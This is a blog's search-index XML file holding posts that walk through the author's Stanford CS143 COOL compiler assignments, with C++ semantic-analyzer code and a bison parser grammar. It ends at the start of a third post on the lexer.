<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[[CS143-PA3] Semantic Analyzer]]></title>
    <url>%2F2019%2F05%2F01%2FCOOL%2F4%2F</url>
    <content type="text"><![CDATA[[CS143-PA3] Semantic Analyzer令和きれいだ full fille link https://github.com/Aria461863631/cs143/tree/master/PA4 used files semant.c: write semantic analysis in semant() function semant.h: header file cool-tree.h or cool-tree.handcode.h: add additional declarations symtab_example.cc: example for using SymbolTable 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void program_class::semant()&#123; initialize_constants(); /* ClassTable constructor may do some semantic analysis */ ClassTable *classtable = new ClassTable(classes); /* some semantic analysis code may go here (3-passes total) */ installMethods(Object); checkClassesType(Object); if (classtable-&gt;errors()) &#123; cerr &lt;&lt; "Compilation halted due to static semantic errors." &lt;&lt; endl; exit(1); &#125; &#125; Inheritancestart implementing ClassTable for representing the inheritance graph. 1 2 3 4 5 6 ClassTable::ClassTable(Classes classes) : semant_errors(0) , error_stream(cerr) &#123; /* check inheritance when building inheritance graph * If the inheritance graph is not well-defined, * it is acceptable to abort compilation */ &#125; requirements All class names are globally visible. inheritance graph be acyclic basic classesIt is an error to inherit from or redefine Int, Str, Bool.It is an error to redefine the IO class.A class can make use of the methods in the IO class by inheriting from IO. It is also an error if class A inherits from class B but class B is not defined. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 ClassTable::ClassTable(Classes classes) : semant_errors(0), error_stream(cerr) &#123; install_basic_classes(); /* * in semant.h * std::map&lt;Symbol, Class_&gt; ClassTable::m_classes * a map from Symbol to Class_ * ============================================== * std::map&lt;Symbol, std::list&lt;Symbol&gt;&gt; edges; * a map from Symbol to its child Symbols * building inheritance tree */ // dfs use std::map&lt;Class_, int&gt; visited; log &lt;&lt; "Start checking inheritance" &lt;&lt; std::endl; /* Fill this in */ for (int i = classes-&gt;first(); classes-&gt;more(i); i = classes-&gt;next(i)) &#123; curclass = classes-&gt;nth(i); Symbol curname = curclass-&gt;get_name(); if (curname == SELF_TYPE || curname == Int || curname == IO || curname == Bool || curname == Str || curname == Object) &#123; semant_error(curclass) &lt;&lt; "Error! Redefinition of basic class " &lt;&lt; curname &lt;&lt; std::endl; return; &#125; if (mp_class.find(curname) != mp_class.end()) &#123; semant_error(curclass) &lt;&lt; "Error! Class " &lt;&lt; curname &lt;&lt; " was previously defined\n"; return; &#125; // install map; mp_class.insert(std::make_pair(curname, curclass)); visited.insert(std::make_pair(curclass, 0)); edges[curclass-&gt;get_parent()].push_back(curname); &#125; if (mp_class.find(Main) == mp_class.end()) &#123; semant_error() &lt;&lt; "Class Main is not defined.\n"; return; &#125; log &lt;&lt; "DFS begin\n"; // dfs for asyclic bool err = false, cycle = false; for (int i = classes-&gt;first(); classes-&gt;more(i); i = classes-&gt;next(i)) &#123; curclass = classes-&gt;nth(i); if (visited[curclass] == 0) &#123; DFS(curclass, classes, visited, err, cycle); if (err) return; &#125; &#125; &#125; /* * find cycles in inheritance path * using dfs topologic sort */ void ClassTable::DFS(Class_ cur, Classes classes, std::map&lt;Class_, int&gt; &amp;vis, bool &amp;err, bool &amp;cycle) &#123; log &lt;&lt; "DFS class " &lt;&lt; cur-&gt;get_name() &lt;&lt; "\n"; if (vis[cur] == 1) &#123; cycle = true; err = true; return; &#125; Symbol parent_name = cur-&gt;get_parent(); if (mp_class.find(parent_name) == mp_class.end()) &#123; semant_error(cur) &lt;&lt; "Error! Class " &lt;&lt; cur-&gt;get_name() &lt;&lt; " inherits from an undefined class " &lt;&lt; parent_name &lt;&lt; std::endl; err = true; return; &#125; if (parent_name == Int || parent_name == Str || parent_name == Bool || parent_name == SELF_TYPE) &#123; semant_error(cur) &lt;&lt; "Error! Class " &lt;&lt; cur-&gt;get_name() &lt;&lt; " cannot inherit " &lt;&lt; parent_name &lt;&lt; std::endl; err = true; return; &#125; vis[cur] = 1; if (parent_name != Object) DFS(mp_class[parent_name], classes, vis, err, cycle); if (cycle) &#123; // print all classes involved in a cycle semant_error(cur) &lt;&lt; "Error! Class " &lt;&lt; cur-&gt;get_name() &lt;&lt; " is involved in an inheritance cycle\n"; &#125; if (err) return; vis[cur] = 2; &#125; Naming and ScopingThe type environment consists of three parts: the name of the current class $ C $ an object environment $ O $ is a function of the form $$ O(v) = T $$which assigns the type $ T $ to object identifier $ v $. a method environment $ M $ it is a function of the form $$ M (C, f ) = (T_1 , . . . , T _{n−1} , T _n ) $$ $ C $ is a class name (a type), $ f $ is a method name, and $ t_1 , . . . , t_n $ are types. The tuple of types is the signature of the method. The interpretation of signatures is thatin class $ C $ the method $ f $ has formal parameters of types $ (t_1 , . . . , t_{n−1} ) $—in that order—and a return type $ t_n $ using symbol table to represent type environment 1 2 3 4 5 6 7 static Class_ curclass = NULL; // ObjectId to Class(Type) static SymbolTable&lt;Symbol, Symbol&gt; objectEnv; // methods map along inheritance path static SymbolTable&lt;Symbol, Feature_class&gt; inheritEnv; // ClassName to methodName to methods static std::map&lt;Symbol, SymbolTable&lt;Symbol, Feature_class&gt;&gt; methodEnv; install symbol tables In Cool all attributes have scope local to the class, and all methods have global scope. first install global method table 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 /* * utils fuction for AddMethod * compare two formal list of methods in different classes */ Symbol method_class::matchFormals(Formals actual) &#123; Symbol type = return_type; for (int i = actual-&gt;first(); actual-&gt;more(i); i = actual-&gt;next(i)) &#123; Symbol actual_type = actual-&gt;nth(i)-&gt;get_typedecl(); if (formals-&gt;more(i) == false) &#123; return No_type; &#125; Symbol declar_type = formals-&gt;nth(i)-&gt;get_typedecl(); if (declar_type != actual_type) &#123; return No_type; &#125; &#125; return type; &#125; /* * If a class C inherits a method f from an ancestor class P, then C may * override the inherited definition of f provided the number of arguments, the * types of the formal parameters, and the return type are exactly the same in * both definitions. */ void method_class::AddMethod() &#123; log &lt;&lt; "addMethod: " &lt;&lt; name &lt;&lt; " in class " &lt;&lt; curclass-&gt;get_name() &lt;&lt; std::endl; if (inheritEnv.lookup(name) != NULL) &#123; Feature oldmethod = inheritEnv.lookup(name); Symbol oldret_type = oldmethod-&gt;matchFormals(formals); if (oldret_type == No_type || oldret_type != return_type) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; "Invalid override\n"; &#125; &#125; inheritEnv.addid(name, copy_Feature()); methodEnv[curclass-&gt;get_name()].addid(name, copy_Feature()); &#125; /* * DFS from Object to all child classes * use inheritEnv to record methods along current inheritance path * use methodEnv to record methods in each class (without parent methods) */ void program_class::installMethods(Symbol classname) &#123; curclass = classtable-&gt;getClassByName(classname); inheritEnv.enterscope(); methodEnv[classname].enterscope(); Features fs = curclass-&gt;get_features(); for (int i = fs-&gt;first(); fs-&gt;more(i); i = fs-&gt;next(i)) &#123; Feature curFeature = fs-&gt;nth(i); curFeature-&gt;AddMethod(); &#125; //dfs to children std::list&lt;Symbol&gt;::iterator iter; std::list&lt;Symbol&gt; nexClass = classtable-&gt;getChildClasses(classname); for (iter = nexClass.begin(); iter != nexClass.end(); ++iter) installMethods(*iter); inheritEnv.exitscope(); &#125; then install object table 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 void attr_class::AddAttribute() &#123; log &lt;&lt; "addAttribute: " &lt;&lt; name &lt;&lt; " " &lt;&lt; type_decl &lt;&lt; std::endl; if (name == self) classtable-&gt;semant_error(curclass) &lt;&lt; "'self' cannot be the name of an attribute\n"; else if (objectEnv.lookup(name) != NULL) classtable-&gt;semant_error(curclass) &lt;&lt; "Attribute " &lt;&lt; name &lt;&lt; " is an attribute of an inherited class\n" &lt;&lt; std::endl; objectEnv.addid(name, new Symbol(type_decl)); &#125; /* * DFS from Object as above */ void program_class::checkClassesType(Symbol classname) &#123; curclass = classtable-&gt;getClassByName(classname); objectEnv.enterscope(); objectEnv.addid(self, new Symbol(SELF_TYPE));//add self symbol Features fs = curclass-&gt;get_features(); for (int i = fs-&gt;first(); fs-&gt;more(i); i = fs-&gt;next(i)) &#123; Feature curFeature = fs-&gt;nth(i); curFeature-&gt;AddAttribute(); &#125; /* * start type checking under local object environment */ if (!classtable-&gt;isBasicClass(classname)) &#123; for (int i = fs-&gt;first(); fs-&gt;more(i); i = fs-&gt;next(i)) &#123; Feature curFeature = fs-&gt;nth(i); curFeature-&gt;CheckFeatureType();//type check in arrtibute and method &#125; &#125; //dfs to child std::list&lt;Symbol&gt;::iterator iter; std::list&lt;Symbol&gt; nexClass = classtable-&gt;getChildClasses(classname); for (iter = nexClass.begin(); iter != nexClass.end(); ++iter) checkClassesType(*iter); //close local environment objectEnv.exitscope(); &#125; Type Checkingimplemented in a single traversal over AST type environment is passed down the tree: from parent to child types are passed up the tree: from child to parent method 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 void formal_class::AddFormal() &#123; if (name == self) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; "'self' cannot be the name of a formal parameter\n"; &#125; if (type_decl == SELF_TYPE) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; "Formal parameter " &lt;&lt; name &lt;&lt; " cannot have type SELF_TYPE\n"; &#125; log &lt;&lt; "addFormal: " &lt;&lt; name &lt;&lt; " " &lt;&lt; type_decl &lt;&lt; std::endl; if (objectEnv.probe(name) != NULL) classtable-&gt;semant_error(curclass) &lt;&lt; "Formal parameter " &lt;&lt; name &lt;&lt; " is multiply defined\n"; objectEnv.addid(name, new Symbol(type_decl)); &#125; Symbol method_class::CheckFeatureType() &#123; objectEnv.enterscope(); for (int i = formals-&gt;first(); formals-&gt;more(i); i = formals-&gt;next(i)) &#123; Formal f = formals-&gt;nth(i); f-&gt;AddFormal(); &#125; Symbol expr_type = expr-&gt;CheckExprType(); Symbol type = expr_type; log &lt;&lt; "check Method: " &lt;&lt; name &lt;&lt; " " &lt;&lt; expr_type &lt;&lt; " " &lt;&lt; return_type &lt;&lt; std::endl; if (classtable-&gt;isSubtype(expr_type, return_type) == false) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; "Inferred return type " &lt;&lt; expr_type &lt;&lt; " of method " &lt;&lt; name &lt;&lt; " does not conform to declared return type " &lt;&lt; return_type &lt;&lt; std::endl; type = Object; &#125; objectEnv.exitscope(); return type; &#125; attribute 1 2 3 4 5 6 7 8 9 10 11 12 13 Symbol attr_class::CheckFeatureType() &#123; log &lt;&lt; "\t attr_class \n"; Symbol expr_type = init-&gt;CheckExprType();//recursively check expressions type if (expr_type == No_type) return type_decl; Symbol type = expr_type; if (classtable-&gt;isSubtype(expr_type, type_decl) == false) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; "Error! feature assign invalid\n"; type = Object; &#125; return type; &#125; Code Generator InterfaceFor every expression node, its type field must be set to the Symbol naming the type inferred by your type checker. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //in cool-tree.handcode.h #define Expression_EXTRAS \ Symbol type; \ Symbol get_type() &#123; return type; &#125; \ Expression set_type(Symbol s) &#123; \ type = s; \ return this; \ &#125; \ virtual void dump_with_types(ostream &amp;, int) = 0; \ void dump_type(ostream &amp;, int); \ Expression_class() &#123; type = (Symbol)NULL; &#125; \ virtual Symbol CheckExprType() = 0; #define Expression_SHARED_EXTRAS \ void dump_with_types(ostream &amp;, int); \ Symbol CheckExprType(); static vs dynamic The dynamic type of an object is the class $ C $ that is used in the new C expression that created it Soundness theorem for Cool type system; $ \forall E, dynamic\_type(E) \le static\_type(E) $ all operations that can be used on an object of type $ C $ can also be used on an object of type $ C^{‘} \le C $ 1 2 3 4 5 6 7 8 class A &#123;...&#125; class B inherits A &#123;...&#125; class Main&#123; //x has static type A and dynamic type A x:A &lt;- new A; //x has static type A and dynamic type B x &lt;- new B; &#125; static-dispatch 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 Symbol method_class::matchFormals(Expressions actual) &#123; Symbol type = return_type; for (int i = actual-&gt;first(); actual-&gt;more(i); i = actual-&gt;next(i)) &#123; Symbol actual_type = actual-&gt;nth(i)-&gt;CheckExprType(); if (formals-&gt;more(i) == false) &#123; return Object; &#125; Symbol declar_type = formals-&gt;nth(i)-&gt;get_typedecl(); if (classtable-&gt;isSubtype(actual_type, declar_type) == false) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; "Error! unmatched formal type\n"; type = Object; &#125; &#125; return type; &#125; Symbol static_dispatch_class::CheckExprType() &#123; log &lt;&lt; "\t static dispatch\n"; Symbol expr_type = expr-&gt;CheckExprType();//check e0 type //static dispatch to type T, so e0 must be a subtype if (classtable-&gt;isSubtype(expr_type, type_name) == false) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; "Expression type " &lt;&lt; expr_type &lt;&lt; " does not conform to declared static dispatch type " &lt;&lt; type_name &lt;&lt; std::endl; type = Object; return type; &#125; //find method in class T's ancestor, return ancestor class name Symbol ancestor = classtable-&gt;findMethodInAncestor(type_name, name); if (ancestor == No_class) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; "Error! cannot find method " &lt;&lt; name &lt;&lt; std::endl; type = Object; return type; &#125; //return method from method table Feature_class *method = methodEnv[ancestor].lookup(name); //match formals of expression types and formal types type = method-&gt;matchFormals(actual); if (type == SELF_TYPE) type = expr_type; return type; &#125; if 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Symbol cond_class::CheckExprType() &#123; log &lt;&lt; "\t cond(if else)\n"; Symbol pred_type = pred-&gt;CheckExprType(); if (pred_type != Bool) classtable-&gt;semant_error(curclass) &lt;&lt; "Error! condition has non-bool predicate\n"; Symbol then_type = then_exp-&gt;CheckExprType(); Symbol else_type = else_exp-&gt;CheckExprType(); type = then_type; //return lca of types, because we don't know the predicate result now if (else_type != No_type) type = classtable-&gt;CommonAncestor(then_type, else_type);//return lca of types return type; &#125; case Case expressions provide runtime type tests on objects. First, $ e_0 $ is evaluated and its dynamic type C noted. Next, from among the branches the branch with the least type $ T_k $ such that $ C ≤ T_k $ is selected. The identifier $x_k$ is bound to the value of $ e_0 $ and the expression $ e_k $ is evaluated. The result of the case is the value of $ e_k $ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 Symbol typcase_class::CheckExprType() &#123; log &lt;&lt; "\t cases \n"; expr-&gt;CheckExprType(); std::set&lt;Symbol&gt; s; int i = cases-&gt;first(); type = cases-&gt;nth(i)-&gt;CheckBranchType(); for (int i = cases-&gt;first(); cases-&gt;more(i); i = cases-&gt;next(i)) &#123; Case oneBranch = cases-&gt;nth(i); if (s.find(oneBranch-&gt;get_typedecl()) != s.end()) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; "Error! branch has same type\n"; &#125; s.insert(oneBranch-&gt;get_typedecl()); Symbol branch_type = oneBranch-&gt;CheckBranchType(); type = classtable-&gt;CommonAncestor(type, branch_type); &#125; return type; &#125; Symbol branch_class::CheckBranchType() &#123; log &lt;&lt; "\t branch\n"; objectEnv.enterscope(); objectEnv.addid(name, new Symbol(type_decl)); Symbol type = expr-&gt;CheckExprType(); objectEnv.exitscope(); return type; &#125; let-init Typing a multiple letlet $ x_1 : T_1 [← e_1 ], x_2 : T_2 [← e_2], . . . , x_n : T_n [← e_n ] $ in $ e $is defined to be the same as typinglet $ x_1 : T_1 [← e_1 ] $ in (let_expr…) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Symbol let_class::CheckExprType() &#123; log &lt;&lt; "\t let\n"; objectEnv.enterscope(); if (identifier == self) classtable-&gt;semant_error(curclass) &lt;&lt; "'self' cannot be bound in a 'let' expression\n"; objectEnv.addid(identifier, new Symbol(type_decl));//add one symbol Symbol ini_type = init-&gt;CheckExprType(); type = body-&gt;CheckExprType(); if (ini_type != No_type) if (classtable-&gt;isSubtype(ini_type, type_decl) == false) classtable-&gt;semant_error(curclass) &lt;&lt; "Error! let init val not child\n"; objectEnv.exitscope(); return type; &#125; new 1 2 3 4 5 6 7 8 9 10 Symbol new__class::CheckExprType() &#123; log &lt;&lt; "\t new_class \n"; type = type_name; if (type != SELF_TYPE &amp;&amp; classtable-&gt;getClassByName(type_name) == NULL) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; " Undefined return type " &lt;&lt; type_name &lt;&lt; std::endl; type = Object; &#125; return type; &#125; var 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Symbol object_class::CheckExprType() &#123; log &lt;&lt; "\t object class\n"; Symbol *found_type = objectEnv.lookup(name); if (found_type == NULL) &#123; classtable-&gt;semant_error(curclass) &lt;&lt; "Undeclared identifier " &lt;&lt; name &lt;&lt; std::endl; type = Object; &#125; else type = *found_type; return type; &#125; SELF_TYPEThe type SELF_TYPE is used to refer to the type of the self variable. Note that the meaning of SELF_TYPE is not fixed, but depends on the class in which it is used. $ SELF\_TYPE_C$ to refers to an occurrence of SELF_TYPE in the body of C cannot return self with a concrete type 1 2 3 4 5 6 7 8 9 10 11 12 class Count&#123; i:Int &lt;- 0; //must return SELF_TYPE, so that inc method works in child classes inc():Count&#123;&#123;i&lt;-i+1;self;&#125;&#125;; &#125;; class Stock inherits Count&#123; name:Str; &#125; class Main&#123; //if inc return Count, than assignment failed Stock a &lt;- (new Stock).inc(); &#125; inheritance rule Let $ T $ and $T^{‘} $ be any types but SELF_TYPE $ SELF\_TYPE_C \le SELF\_TYPE_C$ In Cool we never compare SELF_TYPE coming from different classes $ SELF\_TYPE_C \le T $ if $ C \le T $ $ SELF\_TYPE_C $ can be any subtype of C, including C itself $ T \le SELF\_TYPE_C $ always false least upper bound rule lub($ SELF\_TYPE_C $, $SELF\_TYPE_C$) = $ SELF\_TYPE_C $ lub($ SELF\_TYPE_C $,$ T $) = lub($ C $, $ T $) lub($ T $,$ SELF\_TYPE_C $) = lub($ C $, $ T $) Finally, SELF TYPE may be used in the following places: new SELF_TYPE the return type of a method 1 m(x:T):SELF_TYPE&#123;...&#125; the declared type of a let variable 1 let x:SELF_TYPE in E the declared type of an attribute. 1 x:SELF_TYPE actual arguments of methods ( ≤ declared arguments type ) type of dispatch expression 1 2 e0 : SELF_TYPE e0.f(e1,e2..en) No other uses of SELF_TYPE are permitted. classname 1 2 //T, T' cannot be SELF_TYPE class T inherits T' &#123;...&#125; static dispatch 1 2 //T cannot be SELF_TYPE m@T.f(E1,E2...En) formal parameters functions 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 bool ClassTable::isSubtype(Symbol child, Symbol father) &#123; if (child == SELF_TYPE &amp;&amp; father == SELF_TYPE) return true; if (father == SELF_TYPE) return false; if (child == SELF_TYPE) child = curclass-&gt;get_name(); log &lt;&lt; "\t\t\t isSubtype"; while (child != father &amp;&amp; child != No_class) &#123; child = mp_class[child]-&gt;get_parent(); &#125; if (child == father) return true; return false; &#125; Symbol ClassTable::findMethodInAncestor(Symbol classname, Symbol methodname) &#123; if (classname == SELF_TYPE) classname = curclass-&gt;get_name(); if (classname == No_class) return No_class; if (methodEnv[classname].lookup(methodname) != NULL) return classname; return findMethodInAncestor(mp_class[classname]-&gt;get_parent(), methodname); &#125;]]></content>
      <categories>
        <category>Compilers: Principles, Techniques &amp; Tools</category>
      </categories>
      <tags>
        <tag>COOL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS143-PA2] Parser]]></title>
    <url>%2F2019%2F04%2F10%2FCOOL%2F3%2F</url>
    <content type="text"><![CDATA[[CS143-PA2] ParserTargetwrite a cool parser using bison 0.Preparation PA3 documentation The Cool Reference Manual A Tour of the Cool Support Code : section 6 “Abstract Syntax Trees” bison manual / Dragon book 4.9 Parser Generator 1. Type Declaration temporary types class_list (for program) : [[class;]]+feature_list (for class) : [[feature;]]*method (for feature) : ID( [ formal [[, formal]]* ] ) : TYPE { expr }attribute (for feature) : ID : TYPE [ &lt;- expr ]formal_list (for method in feature) : [formal [[,formal]]* ]expression_list (for dispatch in expression) : [expr [[,expr]]* ]expression_blocks (for blocks in expression) : [[expr;]]+let_expr (for let in expression) : ID : TYPE [ &lt;- expr ] [[,ID : TYPE [ &lt;- expr ] ]]* in exprbranch (for branch in case in expression) : ID : TYPE =&gt; expr;case_list (for case in expression) : [[ID : TYPE =&gt; expr; ]]+ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* Declare types for the grammar&apos;s non-terminals. */ %type &lt;program&gt; program %type &lt;classes&gt; class_list %type &lt;class_&gt; class /* You will want to change the following line. */ %type &lt;feature&gt; feature %type &lt;features&gt; feature_list %type &lt;feature&gt; method %type &lt;feature&gt; attribute %type &lt;formal&gt; formal %type &lt;formals&gt; formal_list %type &lt;expression&gt; expression %type &lt;expressions&gt; expression_list %type &lt;expressions&gt; expression_blocks %type &lt;expression&gt; let_expr %type &lt;case_&gt; branch %type &lt;cases&gt; case_list 2. Precedence All binary operations are left-associative, with the exception of assignment, which is right-associative,and the three comparison operations, which do not associate. 1 2 3 4 5 6 7 8 9 10 /* Precedence declarations go here. */ %right ASSIGN %left NOT %nonassoc LE &apos;&lt;&apos; &apos;=&apos; %left &apos;+&apos; &apos;-&apos; %left &apos;*&apos; &apos;/&apos; %left ISVOID %left &apos;~&apos; %left &apos;@&apos; %left &apos;.&apos; 3. Write rules using Tree package6 Abstract Syntax Trees cool-tour.pdf The AST data type provides, for each kind of Cool construct, a class for representing expressions of that kind. Objects of these classes are nodes in Cool abstract syntax trees. Find constructor declarations in cool-tree.aps or include/cool-tree.hSee 6.5 The Constructors for the usage 1 2 3 4 5 6 7 8 9 10 Program program(Classes); Class_ class_(Symbol, Symbol, Features, Symbol); Feature method(Symbol, Formals, Symbol, Expression); Feature attr(Symbol, Symbol, Expression); Formal formal(Symbol, Symbol); Case branch(Symbol, Symbol, Expression); Expression assign(Symbol, Expression); Expression static_dispatch(Expression, Symbol, Symbol, Expressions); Expression dispatch(Expression, Symbol, Expressions); ... constructor of lists 1 2 3 4 5 6 7 // define the prototypes of the interface Classes nil_Classes(); Classes single_Classes(Class_); Classes append_Classes(Classes, Classes); Features nil_Features(); Features single_Features(Feature); ... self : use idtable to convert into Symbol, use object function to convert into Expression 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 /* Save the root of the abstract syntax tree in a global variable. */ program : class_list &#123; @$ = @1; ast_root = program($1); &#125; ; class_list : class /* single class */ &#123; $$ = single_Classes($1); parse_results = $$; &#125; | class_list class /* several classes */ &#123; $$ = append_Classes($1,single_Classes($2)); parse_results = $$; &#125; ; /* If no parent is specified, the class inherits from the Object class. */ class : CLASS TYPEID &apos;&#123;&apos; feature_list &apos;&#125;&apos; &apos;;&apos; &#123; $$ = class_($2,idtable.add_string(&quot;Object&quot;),$4, stringtable.add_string(curr_filename)); &#125; | CLASS TYPEID INHERITS TYPEID &apos;&#123;&apos; feature_list &apos;&#125;&apos; &apos;;&apos; &#123; $$ = class_($2,$4,$6,stringtable.add_string(curr_filename)); &#125; | error ; /* Feature list may be empty, but no empty features in list. */ feature_list : /* empty */ &#123; $$ = nil_Features(); &#125; | feature &apos;;&apos; &#123; $$ = single_Features($1); &#125; | feature &apos;;&apos; feature_list &#123; $$ = append_Features( single_Features($1), $3 ); &#125; ; feature : method &#123; $$ = $1; &#125; | attribute &#123; $$ = $1; &#125; | error ; method : OBJECTID &apos;(&apos; formal_list &apos;)&apos; &apos;:&apos; TYPEID &apos;&#123;&apos; expression &apos;&#125;&apos; &#123; $$ = method($1, $3, $6, $8); &#125; ; attribute : OBJECTID &apos;:&apos; TYPEID &#123; $$ = attr($1, $3, no_expr()); &#125; | OBJECTID &apos;:&apos; TYPEID ASSIGN expression &#123; $$ = attr ( $1, $3, $5 ); &#125; ; formal_list : /* empty */ &#123; $$ = nil_Formals(); &#125; | formal &#123; $$ = single_Formals($1); &#125; | formal &apos;,&apos; formal_list &#123; $$ = append_Formals( single_Formals($1), $3);&#125; | error ; formal : OBJECTID &apos;:&apos; TYPEID &#123; $$ = formal( $1, $3 ); &#125; ; expression_list : /* empty */ &#123; $$ = nil_Expressions(); &#125; | expression &#123; $$ = single_Expressions( $1 ); &#125; | expression_list &apos;,&apos; expression &#123; $$ = append_Expressions( $1, single_Expressions($3)); &#125; ; expression_blocks : expression &apos;;&apos; &#123; $$ = single_Expressions($1); &#125; | expression &apos;;&apos; expression_blocks &#123; $$ = append_Expressions( single_Expressions($1), $3 ); &#125; | error ; expression /* assign */ : OBJECTID ASSIGN expression &#123; $$ = assign( $1, $3 ); &#125; /* dispatch */ | expression &apos;@&apos; TYPEID &apos;.&apos; OBJECTID &apos;(&apos; expression_list &apos;)&apos; &#123; $$ = static_dispatch ( $1, $3, $5, $7 ); &#125; | expression &apos;.&apos; OBJECTID &apos;(&apos; expression_list &apos;)&apos; &#123; $$ = dispatch( $1, $3, $5 ); &#125; | OBJECTID &apos;(&apos; expression_list &apos;)&apos; /* call object to convert symbol into expression */ &#123; $$ = dispatch( object(idtable.add_string(&quot;self&quot;)), $1, $3 ); &#125; /* if then else */ | IF expression THEN expression ELSE expression FI &#123; $$ = cond( $2, $4, $6 ); &#125; | IF error | IF expression THEN error | IF expression THEN expression ELSE error /* while loop */ | WHILE expression LOOP expression POOL &#123; $$ = loop( $2, $4 ); &#125; | WHILE error | WHILE expression LOOP error /* block */ | &apos;&#123;&apos; expression_blocks &apos;&#125;&apos; &#123; $$ = block( $2 ); &#125; /* let */ | LET let_expr &#123; $$ = $2; &#125; /* case */ | CASE expression OF case_list ESAC &#123; $$ = typcase( $2, $4 ); &#125; /* new */ | NEW TYPEID &#123; $$ = new_( $2 ); &#125; /* isvoid */ | ISVOID expression &#123; $$ = isvoid( $2 ); &#125; /* + - * / ~ &lt; &lt;= = ! () */ | expression &apos;+&apos; expression &#123; $$ = plus( $1, $3 ); &#125; | expression &apos;-&apos; expression &#123; $$ = sub( $1, $3 ); &#125; | expression &apos;*&apos; expression &#123; $$ = mul( $1, $3 ); &#125; | expression &apos;/&apos; expression &#123; $$ = divide( $1, $3 ); &#125; | &apos;~&apos; expression &#123; $$ = neg( $2 ); &#125; | expression &apos;&lt;&apos; expression &#123; $$ = lt( $1, $3 ); &#125; | expression LE expression &#123; $$ = leq( $1, $3 ); &#125; | expression &apos;=&apos; expression &#123; $$ = eq( $1, $3 ); &#125; | NOT expression &#123; $$ = comp( $2 ); &#125; | &apos;(&apos; expression &apos;)&apos; &#123; $$ = $2; &#125; /* object, constant */ | OBJECTID &#123; $$ = object( $1 ); &#125; | INT_CONST &#123; $$ = int_const( $1 ); &#125; | STR_CONST &#123; $$ = string_const( $1 ); &#125; | BOOL_CONST &#123; $$ = bool_const( $1 ); &#125; /* error */ | error ; let_expr : OBJECTID &apos;:&apos; TYPEID IN expression &#123; $$ = let( $1, $3, no_expr(), $5 ); &#125; | OBJECTID &apos;:&apos; TYPEID ASSIGN expression IN expression &#123; $$ = let( $1, $3, $5, $7 ); &#125; | OBJECTID &apos;:&apos; TYPEID &apos;,&apos; let_expr &#123; $$ = let( $1, $3, no_expr(), $5 ); &#125; | OBJECTID &apos;:&apos; TYPEID ASSIGN expression &apos;,&apos; let_expr &#123; $$ = let( $1, $3, $5, $7 ); &#125; ; branch : OBJECTID &apos;:&apos; TYPEID DARROW expression &apos;;&apos; &#123; $$ = branch( $1, $3, $5 ); &#125; ; case_list : branch &#123; $$ = single_Cases( $1 ); &#125; | branch case_list &#123; $$ = append_Cases( single_Cases( $1 ), $2 ); &#125; ; /* end of grammar */ 3.Errors5 Error Handling PA2.pdf If there is an error in a class definition but the class is terminated properly and the next class is syntactically correct, the parser should be able to restart at the next class definition. Similarly, the parser should recover from errors in features (going on to the next feature), a let binding (going on to the next variable), and an expression inside a {…} block.]]></content>
      <categories>
        <category>Compilers: Principles, Techniques &amp; Tools</category>
      </categories>
      <tags>
        <tag>COOL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS143-PA1] Lexer]]></title>
    <url>%2F2019%2F04%2F06%2FCOOL%2F2%2F</url>
